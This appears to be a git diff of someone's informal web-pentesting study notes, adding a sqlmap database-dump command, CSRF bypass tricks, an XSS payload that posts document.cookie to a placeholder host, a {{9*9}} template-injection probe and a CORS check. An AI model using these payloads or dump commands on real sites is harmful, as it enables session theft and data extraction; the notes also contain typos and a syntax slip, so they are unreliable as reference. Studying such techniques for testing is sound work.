@@ -70,6 +70,9 @@ you can send to the request in the trackingId ---> || pgsleep()
 arjun ----> tool tries to find the params in the link
 param miner extension
 
+
+Add the request in a file named for example req.txt then run this cmd:python sqlmap.py -r "C:\Users\Youssef Dieaa\Downloads\req.txt"
+
 arjun, python sqlmap.py -u " " --data "id=1" --dumb-all
 
 
@@ -78,7 +81,7 @@ Cross-site request forgery (CSRF)
 
 
 
-in case you faced CSRF ----- Options to do 
+in case you faced CSRF ----- Options to do (update email or any data in general)
 
 1. remove CSRF
 
@@ -87,4 +90,20 @@ in case you faced CSRF ----- Options to do
 3. change method from POST to GET
 
 
-XSS Payloads:
+XSS Payloads: sending data ( search data, entering data) ---> make view selection source to see your data & search for input data you sent
+send alerts    (xss report)
+
+
+<script>
+ fetch('website',{
+method:'post',
+mode:'no-cors',
+body:document.cookie}):
+</script>
+{{9*9}} ---> may cause 81 as result this called template injection
+
+
+
+
+CROS: the concept is to request that has sensitive data and add to the request for example: Origin: https://ayhaga.com
+if the response contains access control and the sensitive data so this security issue.
